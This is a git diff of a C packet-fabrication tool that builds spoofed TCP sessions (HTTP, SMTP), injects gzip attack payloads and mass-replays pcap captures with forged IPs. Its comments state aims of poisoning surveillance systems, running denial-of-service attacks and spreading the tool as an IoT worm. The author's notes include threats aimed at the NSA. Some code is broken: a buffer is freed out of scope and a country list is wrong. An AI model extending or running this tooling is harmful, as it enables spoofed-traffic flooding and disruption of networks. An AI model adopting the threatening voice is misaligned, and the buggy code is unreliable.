@@ -10,6 +10,10 @@ A lot of random notes here from various different moments.. Just skip down to th
 into routines which are either already coded, or changed..
 
 To the NSA: this is for rape.  I think you guys understand just how much damage this will do.
+And to think.. this is without resources.  What doo you think will happen in the future?
+You people better finish getting rid of everyone now...
+
+11/12 - NSA: you have 3 days to exit my life.. before things get much much worse.
 
 11/10 -
 Starting doing some testing/developing on VMware rather than WSL (Ubuntu on Windows 10)
@@ -190,6 +194,27 @@ icmpp messages such as redirect and host not available, ad port not available co
 
 */
 /*
+https://www.privacytools.io/
+Global Mass Surveillance - The Fourteen Eyes (https://www.privacytools.io/)
+1. Australia 
+2. Canada 
+3. New Zealand 
+4. United Kingdom 
+5. United States of America
+Nine Eyes
+6. Denmark 
+7. France 
+8. Netherlands 
+9. Norway 
+
+Fourteen Eyes
+10. Belgium 
+11. Germany 
+12. Italy 
+13. Spain 
+14. Sweden
+
+char *fourteen_eyes[] = {"AU","CA","NZ","GB","US","DE","FR","NL","NO","BE","DE","IT","ES","SE",NULL};
 geoip [ 
 
     residential finder - generate & verify IPs within particular countries (first world, high intelligene gathering, etc)
@@ -239,6 +264,7 @@ isnt sure then havinng somme situations like this only helps)
 #include <netinet/in.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
+#include <netinet/udp.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <errno.h>
@@ -276,6 +302,13 @@ isnt sure then havinng somme situations like this only helps)
 #include <linux/if_ether.h>
 #include <net/ethernet.h>
 #endif
+
+
+// Global Mass Surveillance - The Fourteen Eyes (https://www.privacytools.io/)
+char *fourteen_eyes[] = {"AU","CA","NZ","GB","US","DE","FR","NL","NO","BE","DE","IT","ES","SE",NULL};
+
+
+
 
 // generic linked list structure which will always work for any structure type with 'next' as its first element
 // you just need to cast to (LINK *<*>)
@@ -400,7 +433,6 @@ int DNS_lookup(DNSQueue *qptr) {
 
 
 ResearchInfo *research_list = NULL;
-// paused are attacks awaiting for another thread/process to complete some task
 AS_attacks *attack_list = NULL;
 
 
@@ -571,7 +603,7 @@ int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
     if (AttackQueueAdd(optr, 1) == 0) {
         // create a thread to add it to the network outgoing queue.. (brings it from 4minutes to 1minute) using a pthreaded outgoing flusher
         if (pthread_create(&optr->thread, NULL, AS_queue_threaded, (void *)optr) != 0) {
-            // if we for some reason cannot pthread (prob memory).. lets do it w waiting
+            // if we for some reason cannot pthread (prob memory).. lets do it blocking
             AttackQueueAdd(optr, 0);
         }
     }
@@ -935,7 +967,6 @@ int AS_perform() {
     int r = 0;
     
     while (aptr != NULL) {
-        
         // try to lock this mutex
         if (pthread_mutex_trylock(&aptr->pause_mutex) == 0) {  
             
@@ -1166,7 +1197,7 @@ int BuildSingleTCP4Packet(PacketBuildInstructions *iptr) {
     int TCPHSIZE = 20;
 
     // this is only for ipv4 tcp
-    if (iptr->type != PACKET_TYPE_TCP_4) return ret;
+    if (iptr->type != PACKET_TYPE_TCP_4) goto end;
 
     // increase the heaader by the size of the TCP options
     if (iptr->options_size) TCPHSIZE += iptr->options_size;
@@ -1178,8 +1209,8 @@ int BuildSingleTCP4Packet(PacketBuildInstructions *iptr) {
     struct packet *p = (struct packet *)final_packet;
 
     // ensure the final packet was allocated correctly
-    if (final_packet == NULL) return ret;
-
+    if (final_packet == NULL) goto end;
+    
     // IP header below
     p->ip.version 	= 4;
     p->ip.ihl   	= IPHSIZE >> 2;
@@ -1228,12 +1259,22 @@ int BuildSingleTCP4Packet(PacketBuildInstructions *iptr) {
     // IP header checksum
     p->ip.check	    = (unsigned short)in_cksum((unsigned short *)&p->ip, IPHSIZE);
 
+    /*
+    // Lets make sure we cover all header variables.. just to be sure it wont be computationally possible
+    // to filter out all packets....
+    __u16 	res1:4 // supposed to be unused..
+    __u16 	ece:1
+    __u16 	cwr:1
+    https://stackoverflow.com/questions/1480548/tcp-flags-present-in-the-header
+    The two flags, 'CWR' and 'ECE' are for Explicit Congestion Notification as defined in RFC 3168.
+    */
+
     // TCP header checksum
     if (p->tcp.check == 0) {
         struct pseudo_tcp *p_tcp = NULL;
         char *checkbuf = (char *)calloc(1,sizeof(struct pseudo_tcp) + TCPHSIZE + iptr->data_size);
 
-        if (checkbuf == NULL) return -1;
+        if (checkbuf == NULL) goto end;
 
         p_tcp = (struct pseudo_tcp *)checkbuf;
 
@@ -1249,8 +1290,6 @@ int BuildSingleTCP4Packet(PacketBuildInstructions *iptr) {
 
         // put the checksum into the correct location inside of the header
         p->tcp.check = (unsigned short)in_cksum((unsigned short *)checkbuf, TCPHSIZE + PSEUDOTCPHSIZE + iptr->data_size + iptr->options_size);
-
-        free(checkbuf);
     }
 
     // copy the TCP options to the final packet
@@ -1266,8 +1305,15 @@ int BuildSingleTCP4Packet(PacketBuildInstructions *iptr) {
     iptr->packet = (char *)final_packet;
     iptr->packet_size = final_packet_size;
 
+    ret = 1;
+
+    end:;
+
+    if (ret != 1) PtrFree(&final_packet);
+    PtrFree(&checkbuf);
+
     // returning 1 here will mark it as GOOD
-    return (ret = 1);
+    return ret;
 }
 
 
@@ -1318,6 +1364,8 @@ PacketBuildInstructions *BuildInstructionsNew(PacketBuildInstructions **list, ui
     bptr->ttl = ttl;
 
     // this relates to operating system emulation.. i'll get the variable here soon
+    // ***
+    // pcap uses its own allocator to be quicker (instead of the ordered below) so this wont affect it..
     bptr->tcp_window_size = 1500;
 
     // FIFO ordering
@@ -1403,7 +1451,7 @@ void OsPick(int options, int *ttl, int *window_size) {
 
 
 // Generates instructions for fabricating a TCP connection being opened between two hosts..
-int GenerateTCPConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list) {
+int GenerateTCP4ConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list) {
     PacketBuildInstructions *bptr = NULL;
     PacketBuildInstructions *build_list = NULL;
     int packet_flags = 0;
@@ -1453,7 +1501,7 @@ int GenerateTCPConnectionInstructions(ConnectionProperties *cptr, PacketBuildIns
 // later we can emulate some packet loss in here.. its just  random()%100 < some percentage..
 // with a loop resending the packet.. super simple to handle.  we can also falsify other scenarios
 // involving ICMP etc.. some very nasty tricks coming.  
-int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client, char *data, int size) {
+int GenerateTCP4SendDataInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client, char *data, int size) {
     PacketBuildInstructions *bptr = NULL;
     PacketBuildInstructions *build_list = NULL;
     int packet_flags = 0;
@@ -1522,6 +1570,7 @@ int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstr
         packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
         packet_ttl = from_client ? cptr->server_ttl : cptr->client_ttl;
         if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;
+
         bptr->header_identifier = *dst_identifier;
         *dst_identifier += 1;
 
@@ -1542,7 +1591,7 @@ int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstr
 
 
 // Generates fabricated packets required to disconnect a TCP session between two hosts.. starting with one side (client or server)
-int GenerateTCPCloseConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client) {
+int GenerateTCP4CloseConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client) {
     PacketBuildInstructions *bptr = NULL;
     PacketBuildInstructions *build_list = NULL;
     int packet_flags = 0;
@@ -1586,7 +1635,9 @@ int GenerateTCPCloseConnectionInstructions(ConnectionProperties *cptr, PacketBui
     if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
     bptr->client = from_client;
     
-    bptr->header_identifier =  *src_identifier; *src_identifier += 1;
+    bptr->header_identifier =  *src_identifier;
+    *src_identifier += 1;
+
     bptr->ack = *remote_seq;
     bptr->seq = *my_seq;
     *my_seq += 1;
@@ -1598,9 +1649,10 @@ int GenerateTCPCloseConnectionInstructions(ConnectionProperties *cptr, PacketBui
     if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;
     bptr->client = !from_client;
 
-    bptr->header_identifier = *src_identifier; *src_identifier += 1;
-    bptr->ack = *my_seq;
+    bptr->header_identifier = *src_identifier;
+    *src_identifier += 1;
 
+    bptr->ack = *my_seq;
     bptr->seq = *remote_seq;
     *remote_seq += 1;
     
@@ -1612,7 +1664,9 @@ int GenerateTCPCloseConnectionInstructions(ConnectionProperties *cptr, PacketBui
     if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
     bptr->client = from_client;
 
-    bptr->header_identifier = *src_identifier; *src_identifier += 1;
+    bptr->header_identifier = *src_identifier;
+    *src_identifier += 1;
+
     bptr->ack = *remote_seq;
     bptr->seq = *my_seq;
     
@@ -1728,8 +1782,6 @@ int BuildSMTPsession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
 
 
 
-
-
 // Fabricates a fake HTTP session to inject information directly into mass surveillance platforms
 // or help perform DoS attacks on their systems to disrupt their usages. This is the NEW HTTP function
 // which uses the modular building routines.
@@ -1789,16 +1841,16 @@ int BuildHTTP4Session(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, 
     cptr.server_emulated_operating_system = 0;
     
     // open the connection...
-    if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) { ret = -2; goto err; }
+    if (GenerateTCP4ConnectionInstructions(&cptr, &build_list) != 1) { ret = -2; goto err; }
 
     // now we must send data from client to server (http request)
-    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, client_body, client_size) != 1) { ret = -3; goto err; }
+    if (GenerateTCP4SendDataInstructions(&cptr, &build_list, FROM_CLIENT, client_body, client_size) != 1) { ret = -3; goto err; }
     
     // now we must send data from the server to the client (web page body)
-    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, server_body, server_size) != 1) { ret = -4; goto err; }
+    if (GenerateTCP4SendDataInstructions(&cptr, &build_list, FROM_SERVER, server_body, server_size) != 1) { ret = -4; goto err; }
 
     // now lets close the connection from client side first
-    if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, FROM_CLIENT) != 1) { ret = -5; goto err; }
+    if (GenerateTCP4CloseConnectionInstructions(&cptr, &build_list, FROM_CLIENT) != 1) { ret = -5; goto err; }
 
     // that concludes all packets
     aptr->packet_build_instructions = build_list;
@@ -1923,6 +1975,7 @@ int GZipAttack(AS_attacks *aptr, int *size, char **server_body) {
     // I hoppe if someone doesn't understand whats going on they dont attempt to change things...
     // but by all means ;) keep attacking.
     if (strstr((char *)*server_body, (char *)"gzip") != NULL) {
+        // pointer to the end of the headers..
         sptr = strstr((char *)*server_body, (char *)"\r\n\r\n"); 
         if (sptr != NULL) {
             sptr += 4;
@@ -2139,7 +2192,7 @@ int GZipAttack(AS_attacks *aptr, int *size, char **server_body) {
 
     //pthread_mutex_lock(&gzip_cache_mutex);
 
-    // cache this gzip attack for the next 15 requests of another
+    // cache this gzip attack for the next X requests
     if (gzip_cache == NULL) {
         gzip_cache = (char *)malloc(*size + 1);
         if (gzip_cache != NULL) {
@@ -2151,13 +2204,9 @@ int GZipAttack(AS_attacks *aptr, int *size, char **server_body) {
         }
     }
 
-    
-
     //printf("\rgzip injected\t\t\n");
     ret = 1;
 end:;
-
-    
 
     // free the decompression buffer.. if its still allocated (and wasnt replaced after a successful compression)
     if (ret != 1 && data && data != *server_body) PtrFree(&data);
@@ -2345,7 +2394,7 @@ void *HTTP4_Create(AS_attacks *aptr) {
         printf("Packet Count: %d\n", L_count((LINK *)aptr->packets));
     #endif
 
-    // if these pointers are not NULL then we need to free them (ptrfree checks)
+    // if the thread DIDNT start (it returns immediately if it did..) then these must be freed 
     PtrFree(&client_body);
     PtrFree(&server_body);
 }
@@ -2353,7 +2402,7 @@ void *HTTP4_Create(AS_attacks *aptr) {
 
 
 // dump all outgoing queued network packets to a pcap file (to be viewed/analyzed, or played directly to the Internet)
-int dump_pcap(char *filename, AttackOutgoingQueue *packets) {    
+int PcapSave(char *filename, AttackOutgoingQueue *packets) {    
     AttackOutgoingQueue *ptr = packets;
     AttackOutgoingQueue *qnext = NULL;
     pcap_hdr_t hdr;
@@ -2591,9 +2640,9 @@ int main(int argc, char *argv[]) {
 
     if (!filename)
         // now lets write to pcap file.. all of those packets.. open up wireshark.
-        dump_pcap((char *)"output.pcap", network_queue);
+        PcapSave((char *)"output.pcap", network_queue);
     else
-        dump_pcap((char *)"output2.pcap", network_queue);
+        PcapSave((char *)"output2.pcap", network_queue);
 
     printf("Time to fabricate, and dump packets to disk: %d seconds\n", (int)(time(0) - start_ts));
 
@@ -2679,7 +2728,7 @@ PacketInfo *PcapLoad(char *filename) {
     return ret;
 }
 
-// Process sessions from a capture into building instructions to replicate, and massively replay
+// Process sessions from a pcap packet capture into building instructions to replicate, and massively replay
 // those sessions :) BUT with new IPs, and everything else required to fuck shit up.
 PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
     PacketBuildInstructions *ret = NULL;
@@ -2708,6 +2757,18 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
 
         // be sure its ipv4..
         if (p->ip.version == 4) {
+
+            /*
+
+            if (p->ip.protocol == IPPROTO_ICMP) {
+
+            }
+
+            if (p->ip.protocol == IPPROTO_UDP) {
+
+            }
+
+            */
             // be sure it is tcp/ip
             if (p->ip.protocol == IPPROTO_TCP) {
                 flags = 0;
@@ -2744,10 +2805,7 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
                     
                 iptr->flags = flags;
                 iptr->ttl = p->ip.ttl;
-                    
-
-                // **** obtain window/OS emulation automated from pcaps
-                iptr->tcp_window_size = 1500;
+                iptr->tcp_window_size = ntohs(p->tcp.window);
 
                 // start OK.. until checksum.. or disqualify for other reasons
                 iptr->ok = 1;
@@ -2916,25 +2974,29 @@ int FilterCheck(FilterInformation *fptr, PacketBuildInstructions *iptr) {
     // verify client IP
     if (fptr->flags & FILTER_CLIENT_IP)
         if (iptr->source_ip != fptr->source_ip)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->source_ip != fptr->destination_ip)))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
+             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->source_ip != fptr->destination_ip)))
                 goto end;
 
     // verify server IP
     if (fptr->flags & FILTER_SERVER_IP)
         if (iptr->destination_ip != fptr->destination_ip)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_ip != fptr->source_ip)))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
+             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_ip != fptr->source_ip)))
                 goto end;
 
     // verify server port (for instance www 80)
     if (fptr->flags & FILTER_SERVER_PORT)
         if (iptr->destination_port != fptr->destination_port)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port)))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
+             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port)))
                 goto end;
     
     // verify client source port
     if (fptr->flags & FILTER_CLIENT_PORT)
         if (iptr->source_port != fptr->source_port)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port)))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
+             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port)))
                 goto end;
 
     // looking for a specific type of packet by its flags..
@@ -2976,7 +3038,6 @@ PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **in
     PacketBuildInstructions *packets = NULL;
     PacketBuildInstructions *ret = NULL;
     FilterInformation fptr;
-    int found_rst = 0;
     /*int count = 0, ccount = 0, fcount = 0;
     struct in_addr src, dst;
     char Asrc_ip[16];
@@ -2990,81 +3051,62 @@ PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **in
     
 
     // enumerate all instruction packets
-    while (iptr != NULL && !found_rst) {
+    while (iptr != NULL) {
         //count++;
+
+        // no point in replaying bad checksum packets...
+        if (iptr->ok != 0) {
         // make sure it matches our filter (right now hard coded for www)
-        if (FilterCheck(flt ? flt : &fptr, iptr)) {
-            //fcount++; // filter couont..
-        
-            // ***
-            // a SYN packet with an ACK of 0 should be the first connecting packet
-            // to start: we wiill support the first TCP/IP connection we grab from the pcap
-            // there are numerous utilities to split PCAPs.. Ill come back to this later
-            if (!src_ip && !dst_ip && !src_port && !dst_port) {
-                if ((iptr->flags & TCP_FLAG_SYN) && iptr->ack == 0) {
-                    // mark this as the client
-                    //iptr->client = 1;
-
-                    // grab the IP addresses, and ports from packet.. we will use as a reference to find the connection
-                    src_ip = iptr->source_ip;
-                    dst_ip = iptr->destination_ip;
-                    src_port = iptr->source_port;
-                    dst_port = iptr->destination_port;
-                }
-            }
-
-            // is it the same connection?
-            if (((src_port == iptr->source_port) && (dst_port == iptr->destination_port)) ||
-                (src_port == iptr->destination_port) && (dst_port == iptr->source_port)) {
-                    // if its coming from the source IP we found as an initial SYN.. its the client
-                    if (iptr->source_port == src_port) {
-                        //ccount++;
-                        iptr->client = (iptr->source_port == src_port);
+            if (FilterCheck(flt ? flt : &fptr, iptr)) {
+                //fcount++; // filter couont..
+            
+                // ***
+                // a SYN packet with an ACK of 0 should be the first connecting packet
+                // to start: we wiill support the first TCP/IP connection we grab from the pcap
+                // there are numerous utilities to split PCAPs.. Ill come back to this later
+                if (!src_ip && !dst_ip && !src_port && !dst_port) {
+                    if ((iptr->flags & TCP_FLAG_SYN) && iptr->ack == 0) {
+                        // grab the IP addresses, and ports from packet.. we will use as a reference to find the connection
+                        src_ip = iptr->source_ip;
+                        dst_ip = iptr->destination_ip;
+                        src_port = iptr->source_port;
+                        dst_port = iptr->destination_port;
                     }
+                }
 
-                    // at this rate i can code a mass surveillance system from scratch almost.
-                    // go figure.
+                // is it the same connection?
+                if (((src_port == iptr->source_port) && (dst_port == iptr->destination_port)) ||
+                    (src_port == iptr->destination_port) && (dst_port == iptr->source_port)) {
+                        // if its coming from the source IP we found as an initial SYN.. its the client
+                        if (iptr->source_port == src_port) {
+                            //ccount++;
+                            iptr->client = (iptr->source_port == src_port);
+                        }
 
-                    // analysis notes:
-                    // for later if we want to take mass packets from pcaps in a directory
-                    // (easy to distribute) and add and automatically attack..
-                    // we should do several passes over files looking for thingss
-                    // we need functions like FindNextPacket() fromm one to another (looking for ACK/SEQ)
-                    // by taking the current packet + its size and looking for the ACK on the opposite side
-                    // tailed with the connection close, or nothing.. paired with the connection finder.. or nothing
-                    // the point of this is to be able to take half sessions for other reasons
-                    // maybe just pulling out englishs text to use in fabricated messages on a mass scalae
-                    // remember it doesnt have to make sense if its just filling up NSA CPU/dtqabase for no reason..
-                    // it can be the middle or parts of other english text or whatever language
-                    // and just thrown into some new pacet would be justified enough
-                
-                    // as an IoT worm.. it would take random data, and popuate it across millions of
-                    // new messages over & over... .. id say mass surveillance would be over.
-                    // dare to try?
+                        // get the next packets pointer..
+                        inext = iptr->next;
+                        
+                        // remove from the list it arrived in.. so we can put into another list which only contains
+                        // a single connection
+                        if (*instructions == iptr)
+                            *instructions = inext;
+                        else
+                            ilast->next = inext;
 
-                    // get the next packets pointer..
-                    inext = iptr->next;
-                    
-                    // remove from the list it arrived in.. so we can put into another list which only contains
-                    // a single connection
-                    if (*instructions == iptr)
-                        *instructions = inext;
-                    else
-                        ilast->next = inext;
+                        // we dont want ths packet going to the next one as it arrived..
+                        iptr->next = NULL;
 
-                    // we dont want ths packet going to the next one as it arrived..
-                    iptr->next = NULL;
+                        // put to linked list in order
+                        L_link_ordered((LINK **)&packets, (LINK *)iptr);
 
-                    // put to linked list in order
-                    L_link_ordered((LINK **)&packets, (LINK *)iptr);
+                        // RST + ACK = last packet.. in the millions of packets it was slow-er without this...
+                        if ((iptr->flags & TCP_FLAG_FIN) && (iptr->flags & TCP_FLAG_ACK))
+                            break;
 
-                    // RST + ACK = last packet.. in the millions of packets it was slow-er without this...
-                    if ((iptr->flags & TCP_FLAG_FIN) && (iptr->flags & TCP_FLAG_ACK))
-                        break;
-
-                    // time to process the next
-                    iptr = inext;
-                    continue;
+                        // time to process the next
+                        iptr = inext;
+                        continue;
+                    }
                 }
             }
 
@@ -3099,7 +3141,6 @@ AS_attacks *InstructionsToAttack(PacketBuildInstructions *instructions, int coun
     int Current_Packet = 0;
     int found_seq = 0;
     int i = 0;
-
 
     // ensure that packet array if ZERO for later...
     memset((void *)&Packets, 0, sizeof(PacketBuildInstructions *) * 16);
@@ -3303,7 +3344,7 @@ int PCAPtoAttack(char *filename, int dest_port, int count, int interval) {
 /*
 typedef struct _points { int x; int y; int n} MPoints;
 CPoints[] = {
-    {00,11,1},{01,22,2},{21,31,3},{31,42,4},{41,53,5},{55,54,6},{54,53,7},{05,15,8},{14,22,9},{03,51,10},{24,35,11},{00,00,00}
+    {00,11,1},{01,22,2},{21,31,3},{31,42,4},{41,53,5},{55,54,6},{54,53,7},{05,15,8},{14,22,9},{03,15,10},{24,35,11},{00,00,00}
 };
 
 int pdiff(int x, int y) {
@@ -3315,6 +3356,7 @@ int pdiff(int x, int y) {
         points[i].x = CPoints[i].x - x;
         if (points[i].x < 0) points[i].x ~= points[i].x;
         points[i].y = CPoints[i].y - y;
+        
         if (points[i].y < 0) points[i].y ~= points[i].y; 
 
         i++;
@@ -3327,11 +3369,9 @@ int pdiff(int x, int y) {
     return ret;
 }
 
-[00,11],[01,22],[21,31],[31,42],[41,53],[55,54],[54,53],[05,15],[14,22],[03,51],[24,35],[00,00]
+[00,11],[01,22],[21,31],[31,42],[41,53],[55,54],[54,53],[05,15],[14,22],[03,15],[24,35],[00,00]
 
 0                       1                                  2                         3                          4                              5
-
-
 
 
 
@@ -3362,7 +3402,9 @@ int pdiff(int x, int y) {
 
 
 
-5                     15                                25                            35                            45                          55
+
+
+5                     15                                   25                        35                           45                           55
 
 
 
@@ -3408,7 +3450,6 @@ int HTTPContentModification(char *data, int size) {
 
 
 
-/*
 
 int BuildSingleUDP4Packet(PacketBuildInstructions *iptr) {
     int ret = -1;
@@ -3425,14 +3466,63 @@ int BuildSingleUDP4Packet(PacketBuildInstructions *iptr) {
     if (final_packet == NULL) return ret;
 
     // IP header below
-    p->ip.version 	= 4;
-    p->ip.ihl   	= IPHSIZE >> 2;
-    p->ip.tos   	= 0;    
-    p->ip.frag_off 	= 0;
-    p->ip.protocol 	= IPPROTO_UDP;
-    p->tot_len      = htons(final_packet_size);
+    p->ip.version       = 4;
+    p->ip.ihl   	    = IPHSIZE >> 2;
+    p->ip.tos   	    = 0;    
+    p->ip.frag_off 	    = 0;
+    p->ip.protocol 	    = IPPROTO_UDP;
+    p->ip.tot_len       = htons(final_packet_size);
 
     //p->udp
 
 }
+
+
+
+int BuildSingleICMP4Packet(PacketBuildInstructions *iptr) {
+    int ret = -1;
+
+    // this is only for ipv4 tcp
+    if (iptr->type != PACKET_TYPE_ICMP_4) return ret;
+
+    /*
+     //ip header
+    struct iphdr *ip = (struct iphdr *) packet;
+    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
+     
+    //zero out the packet buffer
+    memset (packet, 0, packet_size);
+ 
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tos = 0;
+    ip->tot_len = htons (packet_size);
+    ip->id = rand ();
+    ip->frag_off = 0;
+    ip->ttl = 255;
+    ip->protocol = IPPROTO_ICMP;
+    ip->saddr = saddr;
+    ip->daddr = daddr;
+    //ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
+ 
+    icmp->type = ICMP_ECHO;
+    icmp->code = 0;
+    icmp->un.echo.sequence = rand();
+    icmp->un.echo.id = rand();
+    //checksum
+    icmp->checksum = 0;
+    */
+}
+
+/*
+coming soon:
+int BuildSingleTCP6Packet(PacketBuildInstructions *iptr);
+int BuildSingleUDP6Packet(PacketBuildInstructions *iptr);
+int BuildSingleICMP6Packet(PacketBuildInstructions *iptr);
+
+
+need a sniffer which can use filters to find particular sessions
+should have heuristics to find somme gzip http, dns, etc.. 
+
+so the tool can get executed, and automatically populate & initiate
 */
